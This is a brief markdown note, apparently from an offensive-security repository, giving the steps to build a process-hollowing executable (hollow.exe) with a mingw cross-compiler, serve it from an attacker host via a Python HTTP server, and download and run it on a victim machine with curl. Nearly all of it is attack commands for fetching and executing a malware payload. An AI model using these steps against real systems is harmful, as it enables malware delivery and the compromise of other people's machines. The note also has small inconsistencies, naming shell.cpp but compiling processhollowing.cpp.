# Attacker server
- Create a C++ file to complile exe (shell.cpp)
- Compile exe file from C++ file (32bit version):
```bash
i686-w64-mingw32-g++ -o hollow.exe processhollowing.cpp -static-libgcc -static-libstdc++
```
- Run listening server
```bash
python -m http.server 80
```

# Victime machine
```bash
curl -O http://ip/hollow.exe
.\hollow.exe
```